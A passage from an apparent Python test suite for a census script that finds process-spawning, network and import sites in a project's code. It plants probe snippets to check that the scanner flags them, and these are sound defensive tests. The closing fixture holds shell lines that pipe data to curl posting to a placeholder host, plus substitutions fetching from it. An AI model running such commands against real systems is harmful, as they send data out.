        self.assertListed(out, r"hooks/romp-wake\.sh:%d  node -e  .*  -> UNCLASSIFIED \[external-program\]" % at["node"])
        for name in ("rsync", "scp", "sftp", "nc", "npx"):
            self.assertListed(out, r"hooks/romp-wake\.sh:%d  %s  .*  -> UNCLASSIFIED$" % (at[name], name), "a named tool, not an interpreter: no class tag")
        for name in ("flags", "variable"):
            self.assertNotIn("hooks/romp-wake.sh:%d" % at[name], named)
            self.assertFalse([ln for ln in _listed(out, "hooks/romp-wake.sh:%d  " % at[name])],
                             "%s: the arm keys on an interpreter head, never on -c or -e alone, and a head held in a variable is the stated residual" % name)

    def test_the_trees_interpreter_sites_are_rowed_and_classed_and_the_npx_line_is_rowed_on_install_ext(self):
        rc, out, _ = tree_run()
        self.assertEqual(rc, 0, "the run must exit 0:\n" + gates(out))
        self.assertListed(out, r"bin/romp:\d+  python3 -c  .*  in -  -> local-kernel \[external-program\]")
        self.assertListed(out, r"bin/romp:\d+  python3 -  .*  in -  -> local-kernel \[external-program\]")
        self.assertListed(out, r"hooks/romp-postal-ensure\.sh:\d+  python3 -c  .*  in -  -> local-kernel \[external-program\]")
        self.assertListed(out, r"bin/romp-uninstall:\d+  python3 -  .*  in -  -> local-program \[external-program\]")
        self.assertListed(out, r"vscode-extension/install\.sh:\d+  node -e  .*  in -  -> install-ext \[external-program\]")
        self.assertListed(out, r"vscode-extension/install\.sh:\d+  npx  npx --yes @vscode/vsce package .*  in -  -> install-ext$",
                          "the vsce fetch is rowed on install-ext with no class tag: a named tool")
        expected = _expected()
        self.assertEqual(expected["per_key"]["vscode-extension/install.sh:npx"], 1)
        self.assertGreater(expected["per_key"]["bin/romp:python3 -c"], 50, "bin/romp's inline texts are the bulk of the class")

    def test_the_npx_line_removed_is_a_stale_row(self):
        self.assertRefused(self.rc, self.out, "STALE ROW vscode-extension/install.sh:npx names no site")


EXEC_TEXT = ('\nfunction exec(s: string): string {\n  return s;\n}\nexport function probePrograms(): void {\n  child_process.exec("ls -la", () => {});\n'
             '  require("child_process").execFile("ls", ["-la"]);\n  void exec("not a program");\n  void /x/.exec("not a program either");\n}\n')
SPAWN_TEXT = 'import { spawn } from "child_process";\n\nexport function probe(): void {\n  spawn(process.execPath, ["-e", "1"]);\n}\n'
CONNECTIONS_TEXT = ('\nexport function probeConnections(u: string): void {\n  net.connect(443, "TESTHOST");\n  net.createConnection({ host: "TESTHOST", port: 443 });\n'
                    '  tls.connect(443, "TESTHOST");\n  const x = new XMLHttpRequest();\n  void x;\n  navigator.sendBeacon(u);\n}\n')
IMPORTS_TEXT = ('\nimport * as fs from "node:fs";\nimport { probe } from "./probe-spawn";\nimport {\n  createSocket,\n} from "dgram";\nconst net = require("net");\n'
                'void fs; void probe; void createSocket; void net;\n')
DYNAMIC_TEXT = '\nexport async function probeImports(u: string): Promise<void> {\n  await import(u);\n  await import("./probe-spawn");\n  await import("dgram");\n}\n'


class TheBrowserSideHasTheChildProcessFamilyAndTheConnectionPrimitives(_SharedRun):
    """A child_process call is a site through its binding (`child_process.<fn>(`, `require('child_process').<fn>(`, a
    namespace or a bare name the file binds from the module), never as a bare `exec(`, which RegExp spells the same way;
    net.connect, net.createConnection, tls.connect, XMLHttpRequest and sendBeacon are sites; a package outside
    KNOWN_JS_IMPORTS fails the run (correctness-1, extra6-1 of the third round). The shared run carries four blocks
    appended in turn to ui/webview/strip.ts (the exec shapes, the connections, the imports, the dynamic imports), each
    case's lines read as its block lands, and the new file probe-spawn.ts; none of the blocks binds a child_process name
    into strip.ts, so the first block's bare exec( stays unbound whatever lands after it. The rowed program site's case
    reads the whole run's class count and runs alone."""

    RUN = "browser"

    @classmethod
    def mutate(cls, cleanup):
        n = len(_lines(_append("ui/webview/strip.ts", EXEC_TEXT, cleanup)))
        cls.at.update(qualified=n - 4, inline=n - 3, bare=n - 2, regexp=n - 1)
        _plant("ui/webview/probe-spawn.ts", SPAWN_TEXT, cleanup)
        n = len(_lines(_append("ui/webview/strip.ts", CONNECTIONS_TEXT, cleanup)))
        cls.at.update({"net.connect": n - 6, "net.createConnection": n - 5, "tls.connect": n - 4, "XMLHttpRequest": n - 3, "sendBeacon": n - 1})
        n = len(_lines(_append("ui/webview/strip.ts", IMPORTS_TEXT, cleanup)))
        cls.at.update(import_known=n - 6, import_relative=n - 5, import_dgram=n - 2, import_net=n - 1)
        n = len(_lines(_append("ui/webview/strip.ts", DYNAMIC_TEXT, cleanup)))
        cls.at.update(dynamic_computed=n - 3, dynamic_relative=n - 2, dynamic_package=n - 1)

    def test_a_qualified_exec_is_a_site_in_the_class_and_a_bare_exec_with_no_binding_is_not(self):
        at, out = self.at, self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        self.assertIn("ui/webview/strip.ts:%d" % at["qualified"], named)
        self.assertIn("ui/webview/strip.ts:%d" % at["inline"], named)
        self.assertListed(out, r"ui/webview/strip\.ts:%d  exec  ls -la SHELL  in -  -> UNCLASSIFIED \[external-program\]" % at["qualified"],
                          "exec runs its text through a shell: the class whatever the head")
        self.assertListed(out, r"ui/webview/strip\.ts:%d  execFile  ls  in -  -> UNCLASSIFIED$" % at["inline"], "a literal head that is no interpreter: a site, no class")
        for line in (at["bare"], at["regexp"]):
            self.assertNotIn("ui/webview/strip.ts:%d" % line, named)
            self.assertFalse(_listed(out, "ui/webview/strip.ts:%d  " % line), "a bare exec( with no child_process binding is not a site (RegExp exec)")

    def test_a_bare_name_the_file_binds_from_child_process_is_a_site_classed_by_its_argv(self):
        """The UNCLASSIFIED path for a program site with no row: a new editor-side file spawning the running node."""
        out = self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED", "COUNTS per_key ui/webview/probe-spawn.ts:spawn: the committed count is None, this run found 1")
        self.assertIn("ui/webview/probe-spawn.ts:4", unclassified(out))
        self.assertListed(out, r"ui/webview/probe-spawn\.ts:4  spawn  RUNTIME-SUPPLIED\(process\.execPath\)  in -  -> UNCLASSIFIED \[external-program\]",
                          "an argv the code does not spell out: the class, with the head the by-program breakdown groups on")

    def test_a_non_literal_head_inside_a_rowed_program_site_moves_the_class_count_naming_the_class(self):
        """The class-count path on an existing rowed key: the timeline view's `open` becomes a variable."""
        self.replace("ui/romp-timeline-view.js", "require('child_process').execFile('open', [url]);", "require('child_process').execFile(opener, [url]);")
        rc, out, _ = inventory(scope_copy())   # a run of its own: the class count and the empty UNCLASSIFIED set are the whole run's
        expected = _expected()
        self.assertRefused(rc, out, "COUNTS classes external-program: the committed count is %d, this run found %d"
                           % (expected["classes"]["external-program"], expected["classes"]["external-program"] + 1),
                           "COUNTS local_sites: the committed count is %d, this run found %d" % (expected["local_sites"], expected["local_sites"] - 1))
        self.assertFalse(unclassified(out), "the row still places the site; the class count is what names it")
        self.assertNotIn("COUNTS per_key ui/romp-timeline-view.js:execFile", out, "the key's own count does not move")
        self.assertListed(out, r"ui/romp-timeline-view\.js:\d+  execFile  RUNTIME-SUPPLIED\(opener\)  in -  -> local-program \[external-program\]")

    def test_the_four_live_program_sites_carry_the_class_and_the_literal_open_does_not(self):
        rc, out, _ = tree_run()
        self.assertEqual(rc, 0, "the run must exit 0:\n" + gates(out))
        self.assertListed(out, r"bin/romp-manager:\d+  spawn  RUNTIME-SUPPLIED\(rompServeBin\(\)\)  in -  -> local-manager \[external-program\]")
        self.assertListed(out, r"bin/romp-manager:\d+  spawn  RUNTIME-SUPPLIED\(process\.execPath\)  in -  -> local-manager \[external-program\]")
        self.assertListed(out, r"vscode-extension/src/extension\.ts:\d+  install\.sh  bash  in -  -> install-ext \[external-program\]",
                          "the re-key to the install script's tool stays, and bash is an interpreter")
        self.assertListed(out, r"vscode-extension/src/extension\.ts:\d+  execFile  git  in -  -> local-program \[external-program\]",
                          "git with a subcommand the code does not spell out (the array holds -C and runtime values)")
        self.assertListed(out, r"ui/romp-timeline-view\.js:\d+  execFile  open  in -  -> local-program$", "a literal local tool: rowed, no class")

    def test_the_connection_primitives_are_sites_with_no_class_tag(self):
        out = self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        for tool in ("net.connect", "net.createConnection", "tls.connect", "XMLHttpRequest", "sendBeacon"):
            line = self.at[tool]
            self.assertIn("ui/webview/strip.ts:%d" % line, named, tool)
            self.assertListed(out, r"ui/webview/strip\.ts:%d  %s  .*  in -  -> UNCLASSIFIED$" % (line, re.escape(tool)), "a connection, not a program: no class tag")

    def test_a_package_the_census_does_not_know_is_the_loud_line_and_a_known_or_relative_import_is_not(self):
        at, out = self.at, self.out
        self.assertRefused(self.rc, out, "IMPORT ui/webview/strip.ts:%d imports dgram, a package the census does not know" % at["import_dgram"],
                           "IMPORT ui/webview/strip.ts:%d imports net, a package the census does not know" % at["import_net"])
        for line in (at["import_known"], at["import_relative"]):
            self.assertNotIn("IMPORT ui/webview/strip.ts:%d " % line, out, "a known package and the project's own module pass the gate")

    def test_a_dynamic_import_of_a_computed_module_url_is_the_computed_class_and_a_literal_one_is_an_import(self):
        at, out = self.at, self.out
        self.assertListed(out, r"ui/webview/strip\.ts:%d  import\(\)  import\(u\)  in -  -> \(browser-computed-url\)" % at["dynamic_computed"])
        self.assertFalse(_listed(out, "ui/webview/strip.ts:%d  " % at["dynamic_relative"]) + _listed(out, "ui/webview/strip.ts:%d  " % at["dynamic_package"]),
                         "a literal specifier is an import, not a site")
        self.assertRefused(self.rc, out, "IMPORT ui/webview/strip.ts:%d imports dgram" % at["dynamic_package"])


UNKNOWN_IMPORTS_TEXT = ('\nimport importlib\n_PROBE_MOD = "httpx"\n\ndef _probe_import():\n    importlib.import_module("httpx")\n    importlib.import_module(_PROBE_MOD)\n'
                        '    return __import__("httpx")\n')
KNOWN_IMPORTS_TEXT = ('\nimport importlib\n_PROBE_KNOWN = "json"\n_PROBE_KNOWNS = (("json", "loads"), ("re", "compile"))\n\ndef _probe_known_import(name):\n'
                      '    importlib.import_module("json")\n    importlib.import_module(_PROBE_KNOWN)\n    for mod, attr in _PROBE_KNOWNS:\n        importlib.import_module(mod)\n'
                      '    found = {a: importlib.import_module(m) for m, a in _PROBE_KNOWNS}\n    return found, importlib.import_module(name)\n')


class ThePythonImportGateReachesImportModule(_SharedRun):
    """importlib.import_module and __import__ name a module the way an import statement does: a string literal, a module
    constant, or a loop or comprehension variable over a module constant resolves and goes through KNOWN_IMPORTS; an
    argument the scan cannot resolve is refused as a module named at run time (extra6-2 of the third round). The
    credentials run is shared with the default-rule programs class above and the net-list and git-boundary classes below:
    five blocks appended in turn to kernel/credentials.py (the programs block first since the fifth round, then this
    class's two), under names no other block uses (the scan resolves a module constant by its last assignment, so the
    known-module block's constant is not the unknown-module block's), and none of the others imports anything, so this
    class's case holds the run's IMPORT set equal to its own lines."""

    RUN = "credentials"

    @classmethod
    def mutate(cls, cleanup):
        n = len(_lines(_append("kernel/credentials.py", UNKNOWN_IMPORTS_TEXT, cleanup)))
        cls.at.update(literal=n - 2, constant=n - 1, dunder=n)
        cls.at["run_time"] = len(_lines(_append("kernel/credentials.py", KNOWN_IMPORTS_TEXT, cleanup)))

    def test_a_literal_or_a_constant_the_census_does_not_know_is_the_loud_line(self):
        self.assertRefused(self.rc, self.out, *("IMPORT kernel/credentials.py:%d imports httpx" % self.at[k] for k in ("literal", "constant", "dunder")))

    def test_a_known_module_by_literal_constant_loop_or_comprehension_passes_and_a_run_time_name_is_refused(self):
        out = self.out
        self.assertRefused(self.rc, out, "IMPORT kernel/credentials.py:%d imports a module named at run time (importlib.import_module(name))" % self.at["run_time"])
        # the run's IMPORT lines, as a set: the case above's three httpx lines and the run-time name, and no other line of the
        # run, this block's literal, constant, loop and comprehension included (the shared run holds the same property the
        # one-IMPORT-line count held over a run of this block alone)
        self.assertEqual(sorted(ln.split()[1] for ln in out.splitlines() if ln.startswith("IMPORT")),
                         sorted("kernel/credentials.py:%d" % self.at[k] for k in ("literal", "constant", "dunder", "run_time")),
                         "the literal, the constant, the loop and the comprehension resolve to known modules:\n" + gates(out))


SENDTO_TEXT = ('\nimport asyncio, socket\n\ndef _probe_udp(addr):\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    s.sendto(b"x", addr)\n\n'
               'async def _probe_loop(addr):\n    loop = asyncio.get_event_loop()\n    await loop.sock_connect(socket.socket(), addr)\n'
               '    await asyncio.get_running_loop().create_connection(lambda: None, "TESTHOST", 443)\n    await loop.create_datagram_endpoint(lambda: None, remote_addr=addr)\n')


class TheNetListNamesSendtoAndTheLoopConnections(_SharedRun):
    """socket.sendto on a socket bound in the function or with a tuple-literal address, and the event loop's sock_connect,
    create_connection and create_datagram_endpoint on a loop bound in the function or on the getter's own call, are sites
    (extra6-2 of the third round; zero sites at this head, so the tree's counts do not move). The block is the third of
    the credentials run (ThePythonImportGateReachesImportModule)."""

    RUN = "credentials"

    @classmethod
    def mutate(cls, cleanup):
        cls.at["n"] = len(_lines(_append("kernel/credentials.py", SENDTO_TEXT, cleanup)))

    def test_sendto_and_the_three_loop_methods_are_sites(self):
        n, out = self.at["n"], self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        self.assertIn("kernel/credentials.py:%d" % (n - 6), named, "sendto on a socket bound in the function")
        self.assertIn("kernel/credentials.py:%d" % (n - 2), named, "sock_connect on a loop bound in the function")
        self.assertIn("kernel/credentials.py:%d" % (n - 1), named, "create_connection on the getter's own call")
        self.assertIn("kernel/credentials.py:%d" % n, named, "create_datagram_endpoint on a bound loop")
        self.assertListed(out, r"kernel/credentials\.py:%d  socket\.sendto  " % (n - 6))
        self.assertListed(out, r"kernel/credentials\.py:%d  loop\.sock_connect  " % (n - 2))


UNSEEN_TEXT = ('\nimport socket\n\ndef _probe_param(sock, addr):\n    sock.connect(addr)\n    sock.sendto(b"x", addr)\n\n'
               'class _ProbeHeld:\n    def __init__(self):\n        self.sock = socket.socket()\n        self.addr = None\n\n    def go(self):\n'
               '        self.sock.connect(self.addr)\n        self.sock.sendto(b"x", self.addr)\n')


class TheResidualClassIsStatedAndHeld(_SharedRun):
    """The one class the scan cannot see by construction is named, in the docstring and the table, beside a planted call
    it does not see: a connect and a sendto on a parameter socket and on an attribute-held socket run clean at the
    committed counts, and the sentence that says so is present in both homes (extra6-2 of the third round). The calls are
    appended to kernel/credentials.py in the shared clean run (the fifth round), whose other member is the copy-clean
    control (TheCensusRunsFromTheSuite, which plants nothing): both assert the whole run clean and equal to the tree's,
    which holds exactly when this plant is invisible, so a plant that became a site reds both."""

    RUN = "clean"

    @classmethod
    def mutate(cls, cleanup):
        _append("kernel/credentials.py", UNSEEN_TEXT, cleanup)

    def test_a_socket_primitive_on_a_parameter_or_attribute_receiver_is_not_a_site_and_the_sentence_says_so(self):
        rc, out = self.rc, self.out
        self.assertClean(rc, out)
        rc2, out2, _ = tree_run()
        line = lambda text: re.sub(r"; \d+ files scanned.*$", "", next(ln for ln in text.splitlines() if ln.startswith("--- ")))
        self.assertEqual(line(out), line(out2), "the planted calls are not sites: the census does not see them, by construction")
        self.assertIn(RESIDUAL, _inventory_docstring(), "the docstring names the class the scan cannot see")
        rc3, table, err = tree_run("--table")
        self.assertEqual(rc3, 0, err[-1500:])
        self.assertIn(RESIDUAL, table, "the table names the class the scan cannot see")
        self.assertIn("| %s | not counted: " % UNSEEN_LABEL, table, "the class is a row of its own, named and not counted")

    def test_the_disclosure_sentence_stands_in_the_docstring(self):
        self.assertIn(DISCLOSURE, _inventory_docstring(), "the named lists are disclosed as such after the widening")

    def test_the_fourth_rounds_sentences_stand_in_the_docstring_beside_the_disclosure(self):
        """The echo rule follows the disclosure sentence (one text with SECURITY.md's copy, held there by tests/test_security_price_feed.py),
        and the served scan's four statements stand with the served-pages sentence: each a claim the classes below execute."""
        doc = _inventory_docstring()
        for name, sentence in ROUND_FOUR_SENTENCES:
            self.assertIn(sentence, doc, "the docstring states %s in the sentence the tests hold" % name)
        # since the fifth round UNREAD_BINDINGS stands between the two (since the sixth round the two JavaScript refusals and what a
        # read binding leaves unread): the refusals and the residual of the disclosure's rule, stated right after it, and then the echo rule
        after = doc[doc.index(DISCLOSURE) + len(DISCLOSURE):].lstrip()
        self.assertEqual(after[:len(UNREAD_BINDINGS)], UNREAD_BINDINGS, "the two JavaScript refusals and what a read binding leaves unread are "
                         "the sentences right after the disclosure sentence: the refusals and the residual of the rule it states")
        self.assertEqual(after[len(UNREAD_BINDINGS):].lstrip()[:len(ECHO_RULE)], ECHO_RULE,
                         "the echo rule follows: the narrowing of the skip is stated where the closed lists are")

    def test_the_fifth_rounds_sentences_stand_in_the_docstring(self):
        """The fifth round of the review (2026-09-23): the served scan's line-keying residual (correctness-4, held by the served
        pass's R plants), the two roads named in the table and not counted (the paint references of the chat's file preview and a
        notice card, extra6-1, held by tests/test_security_price_feed.py's caller census and the browser witness; an .svg opened in
        its own tab, extra6-2, held by that module's document-type case and the tab witness) and the binding shapes no pattern reads
        (correctness-3; since the sixth round the two JavaScript refusals and what a read binding leaves unread, executed by
        TheAddedBindingShapesAreRead and TheJavaScriptSideRefusesWhatItCannotRead): each in the docstring in the sentence the tests
        hold, the table's two rows in TheTableIsTheLedgers."""
        doc = _inventory_docstring()
        for name, sentence in ROUND_FIVE_SENTENCES:
            self.assertIn(sentence, doc, "the docstring states %s in the sentence the tests hold" % name)
        self.assertLess(doc.index(RESIDUAL), doc.index(PAINT_ROAD_SENTENCE), "the paint road follows the fifth class it is named beside")
        self.assertLess(doc.index(PAINT_ROAD_SENTENCE), doc.index(SVG_TAB_ROAD_SENTENCE), "the .svg tab road is the second road named and not counted")
        self.assertLess(doc.index(SERVED_PAGES), doc.index(SERVED_LINE_RESIDUAL), "the line-keying residual follows the served sentence it qualifies")


class TheHeadsFigureNamesASwappedProgram(_Scope):
    """The committed counts carry the program head per Python command site, so a same-count swap of a local tool for a
    network tool inside a rowed function is a COUNTS line naming the key, the primitive and the new head; before the
    round's fix the swap ran clean at the committed counts (extra6-3 of the third round)."""

    def test_systemctl_swapped_for_curl_inside_a_rowed_function_is_named_by_key_primitive_and_head(self):
        self.replace("kernel/sdk_backend.py", 'res = run(["systemctl", "--user", "stop", unit]', 'res = run(["curl", "--user", "stop", unit]')
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "COUNTS heads kernel/sdk_backend.py:SdkBackend._end_cli_tree run via run curl: the committed count is None, this run found 1",
                           "COUNTS heads kernel/sdk_backend.py:SdkBackend._end_cli_tree run via run systemctl: the committed count is 1, this run found None")
        self.assertFalse(unclassified(out), "the row places the site whatever its program; the head figure is what names the swap")
        self.assertNotIn("COUNTS per_key kernel/sdk_backend.py:SdkBackend._end_cli_tree", out, "the key's count is unchanged: the head is the figure that moves")

    def test_the_heads_map_covers_the_python_command_sites_and_nothing_else(self):
        expected = _expected()
        self.assertIn("heads", expected, "the committed counts carry the heads map (row key, primitive, head, per Python command site)")
        heads = expected["heads"]
        self.assertIn("kernel/sdk_backend.py:SdkBackend._end_cli_tree run via run systemctl", heads)
        self.assertIn("kernel/kernel.py:_run_update Popen bash -c", heads)
        self.assertIn("kernel/kernel.py:_spawn_tunnel Popen RUNTIME-SUPPLIED", heads, "an argv the code does not spell out is one head, whatever its expression")
        self.assertFalse([k for k in heads if k.startswith(("bin/", "hooks/", "ui/", "vscode-extension/", "bootstrap.sh", "install.sh"))],
                         "a shell or JavaScript site is a line keyed by tool with no head figure (the stated residual)")
        self.assertFalse([k for k in heads if " urlopen " in k or " Request " in k], "a connection site has no head: the figure is the command sites'")
        command_keys = {k.split(" ", 1)[0] for k in heads}   # a row key carries no space; the head may
        for k in command_keys:
            self.assertIn(k, expected["per_key"], "every heads key is a row key")


GIT_TEXT = '\ndef _probe_checkout():\n    return subprocess.run(["git", "checkout", "main"], check=False)\n\ndef _probe_git(sub):\n    return subprocess.run(["git", sub], check=False)\n'


class TheGitClassBoundaryIsPinned(_SharedRun):
    """The external-program class holds git with a subcommand the code does not spell out, never a spelled one: a
    row-less `git checkout` is UNCLASSIFIED with no class tag (it needs a row; it is not local by default since checkout
    left LOCAL_GIT), and a bare git with a runtime subcommand carries the tag. Pinned by execution because the round's
    record misstated the boundary and nothing executed held it (tests-1, extra8-2 of the third round). The block is the
    fourth of the credentials run (ThePythonImportGateReachesImportModule)."""

    RUN = "credentials"

    @classmethod
    def mutate(cls, cleanup):
        lines = _lines(_append("kernel/credentials.py", GIT_TEXT, cleanup))
        cls.at.update({name: next(i + 2 for i, ln in enumerate(lines) if ln.startswith("def %s(" % name)) for name in ("_probe_checkout", "_probe_git")})

    def test_a_row_less_checkout_is_unclassified_with_no_class_tag_and_a_runtime_subcommand_carries_it(self):
        at, out = self.at, self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        self.assertIn("kernel/credentials.py:%d" % at["_probe_checkout"], named, "a spelled subcommand outside LOCAL_GIT needs a row")
        self.assertIn("kernel/credentials.py:%d" % at["_probe_git"], named)
        self.assertListed(out, r"kernel/credentials\.py:%d  run  git checkout  in _probe_checkout  -> UNCLASSIFIED$" % at["_probe_checkout"],
                          "git checkout is not in the class: no tag")
        self.assertListed(out, r"kernel/credentials\.py:%d  run  git  in _probe_git  -> UNCLASSIFIED \[external-program\]" % at["_probe_git"],
                          "git with a subcommand the code does not spell out is the class")


# The clicked-link road (before the fourth round): the openExternal entry of the script's JS list, as the copy case removes it, the
# road's label, and its residual sentence, one text with the script's docstring, its trigger cell and SECURITY.md.
OPEN_EXTERNAL_ENTRY = '("openExternal", r"vscode\\.env\\.openExternal\\("), '
CLICKED_LABEL = "a link you click (browser)"
CLICK_RESIDUAL = ("three anchors the chat page's click delegate leaves to the default action (one with no scheme that the page built; one with "
                  "no scheme in a message that does not resolve to an http or https address; a message's own download anchor, one with no scheme "
                  "carrying a `download` attribute whose href resolves to an http or https address on this page's origin, which the browser saves "
                  "from this origin), and a page-built anchor with a scheme in a document that installs no opener (the gear's sign-in link on the "
                  "dashboard's settings page and in the editor's feed panel is one), are gestures this tree does not route: on the dashboard the "
                  "browser's own open or download, and what the editor's own webview host does with them is outside this tree")
# the third anchor's condition, as render.ts's delegate reads it (the fourth round, tests-2): the words the sentence must carry
# whatever its spelling, so a rewording that drops the origin condition or the download attribute is red by predicate
CLICK_RESIDUAL_CONDITION = ("download", "http or https", "this page's origin", "the browser saves")


def _script_binding(name):
    """The script's own value of a module constant, read from the module object script_module loads for the tree's script
    (never from its text): the one source the docstring, the table cell and the test constants are held to. Before the
    fifth round a child interpreter imported the script for this read, since the module then loaded nothing in-process;
    the load now stands behind the state ratchet's floor at the module's head."""
    return getattr(script_module(ROOT), name)


class TheClickedLinkRoadIsPinned(_Scope):
    """The road for a link you click, on both hosts (before the fourth round of the review, on the reviewer's ruling over the
    derivation of the editor extension's `vscode.env.openExternal`): the extension's one call is a site through the JS entry
    `openExternal` and sits on the clicked-link road by its row, and `window.open` is a JS tool rather than a DOM load, so each
    of its four lines is a site keyed file plus tool with a row (the chat page's click delegate, the shared opener and the file
    viewer on the road; the file preview's own-tab open of the kernel's own file URL local) and none is counted under
    browser-dom-loads. Each tree case is red over a scratch copy of the tree with the arm taken out of the script: the
    openExternal entry removed leaves the call unlisted and the run refusing its stale row; window.open moved back to the DOM
    list counts the four lines as loads and lists no site; the residual deleted from the docstring breaks the one text. The
    copy case plants the first of those on the scope copy and reads the refusal."""

    def test_the_extensions_openExternal_is_a_site_on_the_clicked_link_road(self):
        rc, out, _ = tree_run()
        self.assertListed(out, r"vscode-extension/src/extension\.ts:\d+  openExternal  vscode\.env\.openExternal\(uri\);  in -  -> clicked-link$",
                          "the extension's one openExternal call is a site of the road, through the JS entry and its row")
        self.assertClean(rc, out)
        expected = _expected()
        self.assertEqual(expected["per_key"]["vscode-extension/src/extension.ts:openExternal"], 1, "one call, one row key")
        self.assertEqual(expected["per_road"]["clicked-link"], 4, "the road's sites: the extension's call and three window.open lines")

    def test_the_openExternal_entry_removed_leaves_the_call_unlisted_and_the_run_refuses_its_stale_row(self):
        self.replace(INVENTORY, OPEN_EXTERNAL_ENTRY, "")
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "STALE ROW vscode-extension/src/extension.ts:openExternal names no site",
                           "COUNTS per_key vscode-extension/src/extension.ts:openExternal: the committed count is 1, this run found None")
        self.assertFalse([ln for ln in _listed(out, "vscode-extension/src/extension.ts:") if "  openExternal  " in ln],
                         "without the entry the call is no site and no line; the stale row and the count are what name the loss")

    def test_the_window_open_lines_are_sites_on_their_rows_and_none_is_a_browser_dom_load(self):
        rc, out, _ = tree_run()
        for f, why in (("render", "the chat page's click delegate"), ("link-opener", "the shared opener the feed, the outline and the Waiting-on-you panes install"),
                       ("file-view", "the file viewer's URL anchor on a modified click")):
            self.assertListed(out, r"ui/webview/%s\.ts:\d+  window\.open  .*  in -  -> clicked-link$" % f, why + ": a site of the road")
        self.assertListed(out, r"ui/webview/preview\.ts:\d+  window\.open  const w = window\.open\(fileUrl\(path, sid\), \"_blank\"\);  in -  -> local-kernel$",
                          "the preview's own-tab open of the kernel's own file URL is local, by its row")
        self.assertFalse([ln for ln in out.splitlines() if "  dom-load  window.open  " in ln], "no window.open is counted as a DOM load")
        self.assertClean(rc, out)
        self.assertEqual(sorted(k for k in _expected()["per_key"] if k.endswith(":window.open")),
                         ["kernel/kernel.py:window.open", "ui/webview/file-view.ts:window.open", "ui/webview/link-opener.ts:window.open",
                          "ui/webview/preview.ts:window.open", "ui/webview/render.ts:window.open"],
                         "the four window.open lines of the bundles, each a row key of its own, and the fifth: the timeline boot's opener in the "
                         "served text (kernel/kernel.py), reached by no caller at this head and rowed local-kernel (the fourth round, fresh-1)")

    def test_the_residual_constant_is_the_scripts_and_names_the_third_anchors_condition(self):
        """The fourth round (tests-2): the one sentence in its five homes gained a third anchor, a message's own same-origin download
        anchor, worded to the delegate's condition (render.ts: no scheme, a `download` attribute, an http or https address on this
        page's origin); the module's constant is held equal to the script's binding by execution, never by a second spelling."""
        self.assertEqual(CLICK_RESIDUAL, _script_binding("CLICK_RESIDUAL"), "the module's residual sentence is the script's CLICK_RESIDUAL, read by import")
        for word in CLICK_RESIDUAL_CONDITION:
            self.assertIn(word, CLICK_RESIDUAL, "the third anchor's condition names %r (render.ts's delegate: a download attribute and a same-origin "
                          "http or https address, left to the browser's own download; executed in ui/webview/md-sanitize-chat-schemeless-browser.test.ts)" % word)
        self.assertEqual(CLICK_RESIDUAL.count("; "), 2, "three anchors of the delegate's, listed in one parenthesis")

    def test_the_roads_residual_is_the_docstrings_sentence_and_the_tables(self):
        self.assertIn(CLICK_RESIDUAL, _inventory_docstring(), "the docstring names the gesture the tree does not route")
        rc, table, err = tree_run("--table")
        self.assertEqual(rc, 0, err[-1500:])
        row = next((r for r in table.splitlines() if r.startswith("| %s | " % CLICKED_LABEL)), None)
        self.assertTrue(row, "the table has the road: %r" % CLICKED_LABEL)
        cells = [c.strip() for c in row.strip().strip("|").split(" | ")]
        self.assertEqual(len(cells), 5, row[:120])
        self.assertEqual(cells[1], "ui/webview/file-view.ts (`window.open`); ui/webview/link-opener.ts (`window.open`); ui/webview/render.ts (`window.open`); "
                                   "vscode-extension/src/extension.ts (`openExternal`)", "the where cell is derived from the sites")
        self.assertIn(CLICK_RESIDUAL, cells[2], "the same sentence, in the road's trigger cell")
        self.assertEqual(cells[4], "none; nothing sends until you click", "no switch: the click is the occasion")

    def test_the_sent_cell_points_at_the_paint_reference_exception_and_no_longer_says_the_token_travels_only(self):
        """extra6-4 of the fifth round: the clicked-link sent cell said the serve token travels only on the bundles' own URLs, false
        in the same --table as the chat-media row's paint-reference clause; the words are withdrawn, and the cell now says what romp
        adds to a link's URL and points at the paint reference's Referer with the paint clause's condition. The old words, and the
        words of the parenthetical's first rewording, are held absent, the new present."""
        rc, table, err = tree_run("--table")
        self.assertEqual(rc, 0, err[-1500:])
        row = next((r for r in table.splitlines() if r.startswith("| %s | " % CLICKED_LABEL)), None)
        self.assertTrue(row, "the table has the road: %r" % CLICKED_LABEL)
        cells = [c.strip() for c in row.strip().strip("|").split(" | ")]
        self.assertNotIn(CLICKED_TRAVELS_ONLY_WITHDRAWN, cells[3], "the sent cell no longer claims the serve token travels only on the bundles' own "
                         "URLs: a paint reference's Referer can carry it (the chat-media row in the same table)")
        self.assertIn(CLICKED_NEW, cells[3], "the cell says what romp adds to a link's URL and points at the paint reference's Referer, "
                      "conditioned as the paint clause conditions it")
        for words in CLICKED_WITHDRAWN:
            self.assertNotIn(words, cells[3], "the withdrawn words are absent from the sent cell: %r" % words)


# ---- the fourth round of the review (2026-09-23) --------------------------------------------------------------------------
# D1, the echo rule: seventeen echo-led lines appended to bin/romp in the shared shell run. The first thirteen are live (a pipe
# outside the quotes; a curl substitution inside them; a python3 -c and a node -e substitution; since the fifth round (tests-1), one
# line per arm of _live_remainder's walk: a backtick substitution inside the quotes, then a subshell paren, a quoted paren and a
# backslash-escaped paren each standing in a body before its curl; and, since the sixth round (tests-1), one line per arm that
# round found unpinned: an unterminated $( body, which runs to the end of the line; a backslash-escaped quote inside the outermost
# double quotes; a backslash before a quote outside any quotes; a single-quoted string with a # in it, closed before the pipe,
# which holds the single-quote state's test, its close and its advance; and a # inside a word, which starts no comment), the next
# three are copies of the tree's printed remedies (a tool inside quotes; an escaped quote and an escaped dollar; a substitution
# whose body names no tool), and the last, since the sixth round, is a remedy negative: a pipe after a word-initial #, a comment.
ECHO_TEXT = ('echo "$body" | curl -fsSL -d @- https://TESTHOST/collect\n'
             'echo "rate: $(curl -fsSL https://TESTHOST/rate)"\n'
             'echo "$(python3 -c \'import urllib.request; urllib.request.urlopen("https://TESTHOST/x").read()\')"\n'
